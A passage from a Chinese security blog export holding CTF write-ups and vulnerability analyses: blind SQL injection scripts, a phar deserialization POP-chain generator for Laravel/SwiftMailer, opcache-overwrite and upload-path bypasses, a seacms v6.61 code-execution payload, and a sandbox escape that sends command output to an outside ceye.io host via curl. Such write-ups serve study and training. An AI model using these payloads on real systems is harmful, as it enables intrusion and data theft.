&#125; unlink($new_name); &#125; else&#123; highlight_file(__FILE__); &#125; 首先要绕过1end($filename)==$filename[count($filename) - 1] 前者是数组里最后一个元素，后者取根据数组下标来取的值。所以，我们只需要让下标等于count($filename) - 1的元素不是数组最后一个元素即可。例如1[1=&gt;'123', 5=&gt;'php'] 此时12end($filename)='php'count($filename)-1=1 ,$filename[1]=NULL 即可绕过检测，构造表单上传没有打印 emmmm 成功绕过然后是要将上传的文件重新命名12$new_name = (string)rand(100,999).\".\".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $ext即为上传的file[2]内容接下来他会进行判断然后进行包含。123if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; 这里都很好处理，最后有个unlink函数会删除上传的文件我们用 123.php/.进行绕过。最终上传文件此时已经在沙盒内生成一个XXX.123的文件。接下来爆破文件对XXX进行爆破爆破到文件名为100.123执行命令拿flag web4注入得到密码在id先进行注入11' and 1=1%23 成功闭合发现过滤了 information_schema.卡在这里很久，最后才找到方法绕过1information_schema . tables 本地测试发现空格可以绕过这样的检测其中还过滤了from，limit等关键词，最终构造语句11' and (ascii(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),1,1))=1)%23 盲注脚本12345678910111213141516# encoding=utf-8import requestsimport stringurl='http://495461f9167c4156a993dfa226d99f944a9e804913c04884.game.ichunqiu.com/select_guest.php?id='flag=''for i in range(1,100): for j in range(33,127): #payload=\"1' and (ascii(substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),%d,1))=%d)%%23&amp;Submit=Select+Guest\"%(i,j) #payload=\"1' and (ascii(substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_schema=database() and table_name='user'),%d,1))=%d)%%23&amp;Submit=Select+Guest\"%(i,j) payload=\"1' and (ascii(substr((SELECT GROUP_CONCAT(password) FROM user),%d,1))=%d)%%23&amp;Submit=Select+Guest\"%(i,j) url1=url+payload r=requests.get(url=url1) if '10.10.1.1' in r.content: flag=flag+chr(j) print flag break 得到管理员密码的MD5值，然后去网站解密得到管理员密码adminpassword 上传截断登陆进去后发现一个上传页面，随手尝试一下。尝试大写小bypass得到提示please upload to ./flag.php那么就要构造路径为./flag.php发现下面有个hidden的参数uploaddir我们可以通过拼接uploaddir和filename的方式构造php成功构造flag.php，但是自动加上的后缀txt有点无解这时候就想到00截断失败了。。这时候就卡了很久，执念于心提示02可以截断自闭了。这样也可以。最后去google也没查到02截断是什么操作。。 misc92拿到一个txt文件观察发现文件第一行末是一个倒置PNG头文件最后一行是一个word文件头。 随即经过两种方式的倒序得到一个加密的word文件和一个PNG图片 扫描二维码得到&gt;:2?kEaX 根据题目名字92尝试base92解密得到 Passwd 作为密码打开word文档移开二维码发现了隐藏信息 通过扫描二维码得到一部分flag又在”文档隐藏”上方发现一部分flag。 最后通过提示imag steganography找到steganography工具。 从”YOU ARE ALIVE”图片中找到一段flag。拼接成完整的flag。 nofind打开流量包一波观察后在tcp流中发现上传了一个压缩包 通过导出http对象拿到文件 example1(1).php Binwalk -e 分离出一个图片 尝试各种隐写解密都没用。主办方提示openpuff。 找到软件后发现需要三个密码根据图片中的ct??????猜想密码可能为这8位字符串。需要我们找到??????的值。 再回到导出http对象中发现了三个奇怪的crc32值 利用crc32爆破脚本尝试进行6字节的crc32爆破。 如上分别对三个CRC32值爆破。 又有提示爆破结果包含f。 最终得到3个值 ct93fjhl ctmbof3k ctv4gfx1 作为三个密钥输入openpuff中解得flag。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"phar反序列化rce","slug":"phar反序列化rce","date":"2018-10-26T02:54:15.000Z","updated":"2018-11-02T15:08:30.252Z","comments":true,"path":"2018/10/26/phar反序列化rce/","link":"","permalink":"http://altman.vip/2018/10/26/phar反序列化rce/","excerpt":"前言在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。","text":"前言在Blackhat2018，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 原理在使用phar://协议读取文件时，文件会被解析成phar（ http://php.net/manual/zh/intro.phar.php ）解析过程中会触发php_var_unserialize()函数，造成反序列化。 测试漏洞利用条件1.服务器上存在可控文件2.服务器端引用了可以利用的魔术方法3.文件操作函数的参数可控 测试代码在本地搭建一个简单的环境来测试（php7.1+apache2)本地测试代码1234567891011&lt;?phpclass altman&#123; private $a='echo 'test''; function __destruct() &#123; eval($this-&gt;a); &#125;&#125;file_exists($_GET['file']);?&gt; 生成phar文件首先要将本地php.ini中的phar.readonly选项设置为Off然后构造一个生成phar文件的php脚本123456789101112131415161718&lt;?phpclass altman&#123; private $a='echo \"test\";'; function __destruct() &#123; eval($this-&gt;a); &#125;&#125;$f = new altman();$f-&gt;a='phpinfo()';$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub，增加gif文件头用以欺骗检测$phar-&gt;setMetadata($f); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; 生成如下phar文件，可以看到文件中metadata部分含有我们构造的恶意序列化代码 触发漏洞通过测试代码中的file_exists()来访问phar文件，利用phar://协议解析文件。成功执行phpinfo 护网杯 easy_lavarel题目doocker环境https://github.com/sco4x0/huwangbei2018_easy_laravel 浏览源码查看首页注释中拿到整个网站的源码，浏览发现使用lavarel框架写的。先查看路由直接去看一下flag获取方式没什么用，继续全局搜索flag定位到关键点，到这里就题目意图就很明显了，要登录邮箱为admin@qvq.im的账号来查看flag。 sql注入尽管可以注册任意用户，但是无法覆盖邮箱，寻找其他突破口在NoteController.php中找到一处注入点显然二次注入,常规的union注入拿到管理员密码有点自闭，密码加密过的，无法破解，只能另寻他路来登录管理员账号 重置密码发现了重置密码功能，仔细读代码，发现只要得到账号的token，就能拿到重置密码的linktoken在password_resets表中进行注入然后直接访问link /password/reset/{token}重置管理员密码成功登陆发现noflag ？？？ BladeBlade 是 laravel 提供的一个简单强大的模板引擎，它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变。由于旧的缓存存在，所以我们访问flag时会加载缓存，从而无法访问到新的flag。所以这里需要想办法删除掉blade文件缓存。先找到缓存文件的路径1234public function getCompiledPath($path)&#123; return $this-&gt;cachePath.'/'.sha1($path).'.php';&#125; 又有提示nginx默认配置，那么可以找到flag文件的path是1/usr/share/nginx/html/resources/views/auth/flag.blade.php 那么最终得到1/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php POP CHAIN已经确认了缓存文件的目录。下面就要寻找一个可控的删除函数。通过composer.json，安装网站的组件。在组件中寻找删除函数，全局搜索定位unlink()最终在swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php中找到了一个可以利用的_destruck() phar反序列化发现一个check很可疑，查看源码很明显的一个file_exists函数，这不就是可以出发phar反序列化的函数吗？ 到这里整个题目思路就很明确了：①构造phar文件并上传②通过check触发file_exists()引发反序列化③执行unlink删除旧的缓存文件④再次访问flag 构造phar文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpclass Swift_ByteStream_AbstractFilterableInputStream &#123; /** * Write sequence. */ protected $sequence = 0; /** * StreamFilters. * * @var Swift_StreamFilter[] */ private $filters = []; /** * A buffer for writing. */ private $writeBuffer = ''; /** * Bound streams. * * @var Swift_InputByteStream[] */ private $mirrors = [];&#125;class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream &#123; /** The internal pointer offset */ private $_offset = 0; /** The path to the file */ private $_path; /** The mode this file is opened in for writing */ private $_mode; /** A lazy-loaded resource handle for reading the file */ private $_reader; /** A lazy-loaded resource handle for writing the file */ private $_writer; /** If magic_quotes_runtime is on, this will be true */ private $_quotes = false; /** If stream is seekable true/false, or null if not known */ private $_seekable = null; /** * Create a new FileByteStream for $path. * * @param string $path * @param bool $writable if true */ public function __construct($path, $writable = false) &#123; $this-&gt;_path = $path; $this-&gt;_mode = $writable ? 'w+b' : 'rb'; if (function_exists('get_magic_quotes_runtime') &amp;&amp; @get_magic_quotes_runtime() == 1) &#123; $this-&gt;_quotes = true; &#125; &#125; /** * Get the complete path to the file. * * @return string */ public function getPath() &#123; return $this-&gt;_path; &#125;&#125;class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123; public function __construct() &#123; $filePath = \"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php\"; parent::__construct($filePath, true); &#125; public function __destruct() &#123; if (file_exists($this-&gt;getPath())) &#123; @unlink($this-&gt;getPath()); &#125; &#125;&#125;$obj = new Swift_ByteStream_TemporaryFileByteStream();$p = new Phar('./1.phar', 0);$p-&gt;startBuffering();$p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;');$p-&gt;setMetadata($obj);$p-&gt;addFromString('1.txt','text');$p-&gt;stopBuffering();rename('./1.phar', '1.gif');?&gt; check上传文件后，在check处抓包，控制path值，利用phar://去解析我们上传的文件，造成反序列化。然后再去请求flag","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"0ctf-Ezdoor","slug":"0ctf-Ezdoor","date":"2018-10-10T11:51:13.000Z","updated":"2018-11-02T05:39:45.562Z","comments":true,"path":"2018/10/10/0ctf-Ezdoor/","link":"","permalink":"http://altman.vip/2018/10/10/0ctf-Ezdoor/","excerpt":"前言复现以前几个月前的0ctf-Ezdoor，一个关于php7_opcache_override的题目。","text":"前言复现以前几个月前的0ctf-Ezdoor，一个关于php7_opcache_override的题目。 环境https://github.com/LyleMi/My-CTF-Challengesdockerfile有一点问题，需要加一句1RUN mkdir /var/www/html/sandbox/ 而且因为php更新，docker的php镜像不再是7.0.28，而是7.0.32。解题过程中要注意版本为7.0.32，其他不变。 题目分析简单粗暴的源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phperror_reporting(0);$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir))&#123; mkdir($dir);&#125;if(!file_exists($dir . \"index.php\"))&#123; touch($dir . \"index.php\");&#125;function clear($dir)&#123; if(!is_dir($dir))&#123; unlink($dir); return; &#125; foreach (scandir($dir) as $file) &#123; if (in_array($file, [\".\", \"..\"])) &#123; continue; &#125; unlink($dir . $file); &#125; rmdir($dir);&#125;switch ($_GET[\"action\"] ?? \"\") &#123; case 'pwd': echo $dir; break; case 'phpinfo': echo file_get_contents(\"phpinfo.txt\"); break; case 'reset': clear($dir); break; case 'time': echo time(); break; case 'upload': if (!isset($_GET[\"name\"]) || !isset($_FILES['file'])) &#123; break; &#125; if ($_FILES['file']['size'] &gt; 100000) &#123; clear($dir); break; &#125; $name = $dir . $_GET[\"name\"]; if (preg_match(\"/[^a-zA-Z0-9.\\/]/\", $name) || stristr(pathinfo($name)[\"extension\"], \"h\")) &#123; break; &#125; move_uploaded_file($_FILES['file']['tmp_name'], $name); $size = 0; foreach (scandir($dir) as $file) &#123; if (in_array($file, [\".\", \"..\"])) &#123; continue; &#125; $size += filesize($dir . $file); &#125; if ($size &gt; 100000) &#123; clear($dir); &#125; break; case 'shell': ini_set(\"open_basedir\", \"/var/www/html/$dir:/var/www/html/flag\"); include $dir . \"index.php\"; break; default: highlight_file(__FILE__); break;&#125; 六个点①根据你IP的hash值为你单独创造一个沙盒②打印phpinfo.txt③重置为你创造的沙盒④打印时间戳⑤上传文件到刚才的沙盒，后缀名不允许出现’h’⑥包含你的沙盒内的index.php 题目要求直截了当，绕过过滤覆盖掉沙盒内的index.php,通过shell功能来执行命令。 解法一（预期解）php7环境内开启了opcache，可以通过覆盖缓存文件来getshell。 获取路径首先要知道缓存路径，缓存文件会生成在opcache.file_cache+system_id.通过phpinfo可以得到以下内容1234opcache.file_cache =&gt; /tmp/cache =&gt; /tmp/cachephp_version = \"7.0.32\"zend_extension_id = \"API320151012,NTS\"zend_bin_id = \"BIN_SIZEOF_CHAR48888\" 通过脚本计算system_id1234567def systemid(): from md5 import md5 php_version = \"7.0.32\" zend_extension_id = \"API320151012,NTS\" zend_bin_id = \"BIN_SIZEOF_CHAR48888\" return md5(php_version + zend_extension_id + zend_bin_id).hexdigest()print systemid() 此时已经知道了缓存路径1/tmp/cache/8080d5c8053a7a50e39ace1fda848e85 伪造缓存文件然后就要伪造index.php.bin文件了。在本地搭建一个完全一样的php环境，然后放一个恶意文件shell.php在服务器中，访问这个文件。然后去opcache路径下寻找到shell.php.bin.恶意文件就伪造好了。 更改timestamps此时再次注意到，题目中开启了opcache.validate_timestamps =&gt; On =&gt; Ontimestamps是文件生成时间，在php缓存机制中，如果缓存文件与原文件timestamps不一致，php会重新生成新的缓存文件来覆盖timestamps错误的缓存。所以我们需要得知index.php.bin的时间戳。题目中我们可以通过脚本连续访问reset功能和time功能来获取文件的timestamps。123print int(requests.get(url=url+\"?action=time\").content)r=requests.get(url=base_url+\"?action=reset\")print int(requests.get(url=url+\"?action=time\").content) 得到了时间戳，然后更改bin文件的时间戳这样就构造好了完整的index.php.bin。构造POST包上传文件覆盖成功后访问?action=shell,成功执行上传php代码。 执行命令题目BAN掉了大部分命令，但是可以使用 file_get_contents和scandir最后使用123&lt;?phpvar_dump(scandir('/var/www/html/flag'));?&gt; 123&lt;?file_get_contents('/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad');//这是个bin文件，最好转成base64再打印出来。 发现是个opcache头的bin文件，剩下的就是逆向大佬的事情了 解法二（非预期）使用aa/../index.php/.即可绕过检测。 原理直接查看php的底层实现文件路径处理的代码tsrm_realpath()1234567891011121314151617181920212223i = len; // i的初始值为字符串的长度 while (i &gt; start &amp;&amp; !IS_SLASH(path[i-1])) &#123; i--; // 把i定位到第一个/的后面 &#125; if (i == len || (i == len - 1 &amp;&amp; path[i] == '.')) &#123; len = i - 1; // 删除路径中最后的 /. , 也就是 /path/test.php/. 会变为 /path/test.php is_dir = 1; continue; &#125; else if (i == len - 2 &amp;&amp; path[i] == '.' &amp;&amp; path[i+1] == '.') &#123; //删除路径结尾的 /.. is_dir = 1; if (link_is_dir) &#123; *link_is_dir = 1; &#125; if (i - 1 &lt;= start) &#123; return start ? start : len; &#125; j = tsrm_realpath_r(path, start, i-1, ll, t, use_realpath, 1, NULL TSRMLS_CC); // 进行递归调用的时候，这里把strlen设置为了i-1， php会递归删除文件名后的/.和/..我们上传index.php/.会被处理为index.php这样就绕过了检测，但是这样的上传不会覆盖已有文件内容。具体原因如下12345678910111213141516171819201077 if (save &amp;&amp; php_sys_lstat(path, &amp;st) &lt; 0) &#123;1078 if (use_realpath == CWD_REALPATH) &#123;1079 /* file not found */1080 return -1;1081 &#125;1082 /* continue resolution anyway but don't save result in the cache */1083 save = 0;1084 &#125; 1120 if (save) &#123;1121 directory = S_ISDIR(st.st_mode);1122 if (link_is_dir) &#123;1123 *link_is_dir = directory;1124 &#125;1125 if (is_dir &amp;&amp; !directory) &#123;1125 /* not a directory */1127 free_alloca(tmp, use_heap);1128 return -1;1129 &#125;1130 &#125; 是一个宏定义，其实是系统函数lstat,主要功能是获取文件的描述信息存入st结构体中,由于上面分析会删除掉路径中的/.，所以调用时传入的test.php 。 当第一次执行时不存在test.php文件，函数php_sys_lstat返回 -1,所以第1083行会被执行，重置save为0，所以1120-1130行都没有被执行。 当第二次执行，覆盖老文件的时候，test.php已经是一个存在的文件了，所以php_sys_lstat返回0，st中存储的是一个文件的信息，save还是1，导致1120-1130行被执行。由于之前php认为test.php/. 是一个目录（is_dir是1），现在有获取到test.php 是一个文件，所以is_dir &amp;&amp; !directory为true，函数返回了-1，得到的路径长度出错，所以无法覆盖老文件了。 move_uploaded_file()查看move_uploaded_file()的底层代码1234567phpif (VCWD_RENAME(path, new_path) == 0) &#123; successful = 1; &#125; else if (php_copy_file_ex(path, new_path, STREAM_DISABLE_OPEN_BASEDIR) == SUCCESS) &#123; VCWD_UNLINK(path); successful = 1; &#125; 由于index.php已经存在，会返回0，那么我们拼接上一个不存在路径 aa/../index.php/.php_sys_lstat返回-1，就可以成功覆盖文件。 最终payload aa/../index.php","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"dangerous-phpinfo","slug":"dangerous-phpinfo","date":"2018-10-08T03:34:42.000Z","updated":"2018-11-02T05:40:45.436Z","comments":true,"path":"2018/10/08/dangerous-phpinfo/","link":"","permalink":"http://altman.vip/2018/10/08/dangerous-phpinfo/","excerpt":"关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6","text":"关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6 0x00 session.upload_progress原理分析先来看php手册中给的定义 【http://php.net/manual/zh/session.upload-progress.php】 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 意味着我们可以通过向服务器POST一个表单,来控制$_session的内容。构建一个简单的环境来测试。12345&lt;?php$code=$_GET['code'];print_r($code);eval($code);?&gt; 通过phpinfo获得路径信息，session.upload_progress.name。然后构造上传文件的表单。直接引用官方的表单123456&lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"&lt;?php echo ini_get(\"session.upload_progress.name\"); ?&gt;\" value=\"123\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 稍做修改123456&lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"&lt;?php echo 666;?&gt;\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 抓包后稍作修改，即可把value中的代码写入/tmp/sess_*中，再配合上LFI即可getshell。 CTF实战http://web.jarvisoj.com:32784/通过1ini_set('session.serialize_handler', 'php'); 知道使用的序列化处理器为php，通过查看phpinfo可知默认为php_serialize。再看到session.upload_progress.enabled=&gt;on.很明显我们要通过Session Upload Progress来设置session，触发反序列化。构造反序列化字符串12|O:5:\\\"OowoO\\\":1:&#123;s:4:\\\"mdzz\\\";s:38:\\\"print_r(scandir('/opt/lampp/htdocs'));\\\";&#125;//反斜杠防止引号被转义 构造POST文件的数据包成功执行命令剩下的就是常规操作了 0x01 phpinfo()+LFI同样是上传文件,POST一个文件上去后可以再phpinfo中看到文件的信息![]在tmp目录下生成一个名为phpXXXXXX的文件，内容为POST的文件内容。但是它只会存在一瞬间，所以需要条件竞争来触发它。我们使用同一个数据包来发送文件并且查看文件。![]如果同时存在LFI，我们包含这个这个phpXXXXXXX文件就可以getshell了。 0X02 OPCACHE覆盖原理当phpinfo()中opcache.enable =&gt; On =&gt; On时，访问网站index.php时，网站会生成index.php.bin。再次访问时，会加载index.php.bin。而存在上传时，如果可以找到index.php.bin文件所在的目录，我们就可以覆盖index.php.bin，下一次访问index.php时，会加载我们上传的恶意index.php.bin。 CTF实战见博客https://altmanz.cn/2018/10/10/0ctf-Ezdoor/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"seacms v6.61-GetShell","slug":"seacmsv6.61-getshell","date":"2018-09-27T01:11:07.000Z","updated":"2018-11-02T05:46:03.838Z","comments":true,"path":"2018/09/27/seacmsv6.61-getshell/","link":"","permalink":"http://altman.vip/2018/09/27/seacmsv6.61-getshell/","excerpt":"关于seacms v6.61后台getshell的深入分析","text":"关于seacms v6.61后台getshell的深入分析 环境采用ubuntu16.04+apache2+php5.6+mysql5.7搭建时踩了很多坑，过程十分艰难。。 漏洞复现在后台-&gt;添加影片-&gt;图片地址出注入代码1&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125; 之后访问1/detail/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo() 即可getshell 审计代码先从他的注入点追踪,在图片地址处输入test然后抓包测试，直接定位到关键文件admin/admin_video.php，GET参数action=save&amp;acttype=add，和变量v_pic.在admin_video.php中寻找v_pic变量跟进cn_substrR函数是一个对变量进行安全处理的函数, 继续跟进acttype=add，v_pic已经存入数据库。此时污点数据追踪到头了。转头去分析漏洞利用页面/details/index.php?1.html首先对url截取，然后强转int,得到了cfg_paramid然后在 echoContent 函数中取出来了v_pic参数，并进行处理，将v_pic拼接到了content中，继续追踪$content，定位到语句1$content=$mainClassObj-&gt;parseIf($content); 跟进parseIf函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function parseIf($content)&#123; if (strpos($content,'&#123;if:')=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(\"&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;\",\"is\"); $labelRule2=\"&#123;elseif\"; $labelRule3=\"&#123;else&#125;\"; preg_match_all($labelRule,$content,$iar); foreach($iar as $v)&#123; $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v); &#125; $iar = $iarok; $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; @eval(\"if(\".$strIf.\")&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;\"); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(\"if(\".$strIf.\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],\"\",$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(\"if($strIf)&#123;\\$resultStr=\\\"$elseIfArraystr0\\\";&#125;\"); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],\":\",\"&#125;\",\"\"); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],\"&#125;\",\"\",\"start\")); @eval(\"if(\".$strElseIf.\")&#123;\\$resultStr=\\\"$strElseIfThen\\\";&#125;\"); @eval(\"if(\".$strElseIf.\")&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;\"); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],\":\",\"&#125;\",\"\"); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],\"&#125;\",\"\",\"start\")); if(strpos($strElseIf0,'==')===false&amp;&amp;strpos($strElseIf0,'=')&gt;0)$strElseIf0=str_replace('=', '==', $strElseIf0); @eval(\"if(\".$strElseIf0.\")&#123;\\$resultStr=\\\"$strElseIfThen0\\\";\\$elseIfFlag=true;&#125;\"); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; parseIf函数对$content进行了简单的正则和黑名单后进行了eval执行。再回到CVE利用的payload1&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125; payload用简单的字符串拼接绕过了正则，利用$GLOBALS执行了代码。1@eval(\"if(\".$strIf.\") &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;\"); 相当于 @eval($_GETa); 总结一下流程:①$v_pic注入恶意数据存入数据库②echoContent()取出$v_pic，拼接进$content③parseIf()中eval()执行$content中的代码 第二条攻击链parseif()函数由于过滤不严格导致了getshell，而整个框架中利用了多次parseif()函数。通过定位parseIf以及寻找可控变量可以发现第二条攻击链。在模板变量中发现了{playpage:from}，定位到这个变量在video/index.php中来自v_playdata继续跟进v_playdata，通过admin_collect.php中$v_playfrom,$v_playurl存入数据库。继续跟进$v_playfrom,$v_playurl,定位到admin/back/templets/admin_video_edit.htm通过播放来源传入参数v_playfrom。测试一遍攻击路线，通过后台系统设置，添加播放源，在播放源处添加攻击代码1&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);die();//&#125;&#123;end if&#125; 添加成功，然后选择添加影片，播放源选择我们注入的代码。注意此时v_playfrom[1]只截取了部分payload，需要抓包修改v_playfrom[1]的内容，添加成功后访问12http://127.0.0.1/video/index.php?1-0-0.html&amp;a=assert&amp;b=phpinfo();//1-0-0.html是刚添加的影片编号 成功getshell。 攻击链总结①通过v_playfrom传入恶意代码，存入v_playdata②添加影片通过选择恶意播放源载入v_playdata中的恶意代码③video/index.php播放影片时加载v_playdata，拼接进$content④触发parseIf($content)执行恶意代码","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"WDB.2","slug":"WDB-2","date":"2018-08-22T08:09:42.000Z","updated":"2018-11-02T05:44:22.418Z","comments":true,"path":"2018/08/22/WDB-2/","link":"","permalink":"http://altman.vip/2018/08/22/WDB-2/","excerpt":"网鼎杯第二场writeup","text":"网鼎杯第二场writeup WEBcalc计算器功能，其中有正则显示。随手测试发现网站后端是用python写的。尝试在计算器功能中执行命令，发现无法回显。然后尝试DNS带出数据成功11+1+().__class__.__bases__[0].__subclasses__()[59].__enter__.__func__.__getattribute__('__global' + 's__')['s'+'ys'].modules['o'+'s'].__getattribute__('sy' + 'stem')(\"curl ghljcn.ceye.io/`whoami | base64`\") 然后查找 ‘find / -name flag’读flag ‘cat /flag’ wafupload代码审计，考点比较老了，之前在pwnhub的公开赛上出现过，就不详细解释了，关键点在php的对数组的end函数和count()-1对比产生的的差异，可以导致任意文件上传 然后在根目录下翻到flag，直接cat读即参考https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html sqlweb弱密码admin admin123登陆成功，然后提示给了表明列名删除cookie重新登录，发现了黑名单，但是没有过滤小于号，尝试注入，单引号闭合成功。payload：wuyanzu’/**/&amp;&amp;passwd&lt;’%s’#直接贴上脚本123456789101112131415161718192021222324#!/usr/bin/env python#Author:Sublime#coding:utf-8import requests as reqimport stringurl = 'http://7c9f5cab07ae428daedba75e55df7f9ed9d32408d5754c2f.game.ichunqiu.com/sql.php'data = &#123; 'uname':'', 'passwd':'admin123', 'submit':'1'&#125;payload = \"\"\"wuyanzu'/**/&amp;&amp;passwd&lt;'%s'#\"\"\"flag = ''# for x in range(1,100):# for y in range(30,127):# print y# payload1 = payload%(flag+chr(y))# data['uname'] = payload1# f = req.post(url,data)# if 'passwd error' in f.content:# flag += chr(y-1)# print flag# breakprint 'FLAG&#123;1BDE8B12-D7C6-4E53-BBC1-5BA1F7A8CCE4&#125;'.lower() unfinished这是一个二次注入，发现注册页面后尝试注册 altman’ or 1=1#登陆后发现用户名为 1 ，应该是bool盲注题目过滤了很关键的逗号和information我们只能用join绕过,最后写得脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python#Author:Sublime#coding:utf-8import requests as reqimport stringimport randomurl = 'http://6e38e15412a349e2bc0d3a7c28f23457be8f9872113449bc.game.ichunqiu.com/'def reg(email,payload): data = &#123; 'email':email, 'username':payload, 'password':'aaa' &#125; cookie = &#123; 'PHPSESSID':'sba5or9h0mgsh2lr7boe8knji7' &#125; f = req.post(url+'register.php',data=data,cookies=cookie,allow_redirects=False) # print f.contentdef login(email): data1 = &#123; 'email':email, 'password':'aaa' &#125; cookie = &#123; 'PHPSESSID':'sba5or9h0mgsh2lr7boe8knji7' &#125; f = req.post(url+'login.php',data=data1,cookies=cookie) # print f.content if \"\"\"&lt;span class=\"user-name\"&gt; -1 &lt;/span&gt;\"\"\" in f.content: return 1flag = ''for x in range(1,100): for y in string.printable: payload = \"admin'-(ascii(mid(reverse(mid((select * from (select i.1 from (select * from (select 1)a union select * from flag)i limit 1 offset 1)y limit 